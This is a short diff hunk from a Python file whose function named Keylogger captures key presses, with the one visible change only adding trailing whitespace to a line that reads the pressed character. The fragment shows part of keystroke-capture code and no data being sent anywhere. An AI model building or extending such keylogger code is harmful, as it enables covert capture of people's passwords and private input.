@@ -27,7 +27,7 @@ def Keylogger(key):
     global file2
 
     try:
-        k = key.char
+        k = key.char 
     except:
         k2 = key.name
         if k2 == 'backspace' and Num > 0 and Num != 3 and Num != 6:
